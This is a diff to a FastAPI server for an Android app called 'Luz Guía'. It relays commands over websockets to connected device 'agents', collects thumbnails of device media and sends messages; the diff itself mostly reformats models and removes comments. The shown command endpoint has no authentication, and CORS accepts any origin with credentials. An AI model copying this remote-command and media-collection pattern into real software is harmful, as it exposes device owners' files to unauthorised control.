@@ -5,7 +5,7 @@ from typing import List, Dict, Any
 from fastapi.middleware.cors import CORSMiddleware
 from urllib.parse import unquote
 
-app = FastAPI(title="Luz Guía - Backend Android (Completo y Final)")
+app = FastAPI(title="Luz Guía - Backend Android (Final y Corregido)")
 app.add_middleware(
     CORSMiddleware, allow_origins=["*"], allow_credentials=True, allow_methods=["*"], allow_headers=["*"],
 )
@@ -16,18 +16,24 @@ daily_message_cache: Dict[str, Dict[str, str]] = {}
 device_media_cache: Dict[str, Any] = {}
 fetch_status: Dict[str, str] = {}
 
-# --- MODELOS DE DATOS ---
+# --- MODELOS DE DATOS (SINTAXIS CORREGIDA) ---
 class Command(BaseModel):
-    target_id: str; action: str; payload: Any
+    target_id: str
+    action: str
+    payload: Any
 
 class Thumbnail(BaseModel):
-    filename: str; small_thumb_b64: str
+    filename: str
+    small_thumb_b64: str
 
 class ThumbnailChunk(BaseModel):
-    thumbnails: List[Thumbnail]; is_final_chunk: bool
+    thumbnails: List[Thumbnail]
+    is_final_chunk: bool
 
 class BroadcastMessage(BaseModel):
-    device_ids: List[str]; image_b64: str; text: str
+    device_ids: List[str]
+    image_b64: str
+    text: str
 
 # --- ENDPOINTS ---
 
@@ -56,7 +62,6 @@ async def send_command_to_agent(command: Command):
     agent = connected_agents.get(command.target_id)
     if not agent: return {"status": "error", "message": "Agente no conectado"}
     
-    # Si la orden es escanear, reiniciamos la caché y el estado de ese agente
     if command.action == "get_thumbnails":
         device_media_cache[command.target_id] = {}
         fetch_status[command.target_id] = "loading"
@@ -65,8 +70,6 @@ async def send_command_to_agent(command: Command):
         await agent["ws"].send_text(command.json())
         return {"status": "success", "message": "Comando enviado"}
     except Exception as e: return {"status": "error", "message": str(e)}
-
-# --- RUTAS RESTAURADAS PARA EL VISOR DE ARCHIVOS ---
 
 @app.post("/api/submit_media_chunk/{device_id}")
 async def submit_media_chunk(device_id: str, chunk: ThumbnailChunk):
@@ -83,9 +86,6 @@ async def get_media_list(device_id: str):
     status = fetch_status.get(device_id, "complete")
     thumbnails = device_media_cache.get(device_id, {})
     return {"status": status, "thumbnails": thumbnails}
-
-
-# --- RUTAS PARA EL "BUZÓN" DE MENSAJES ---
 
 @app.post("/api/set_daily_message/{device_id}")
 async def set_daily_message(device_id: str, data: dict):
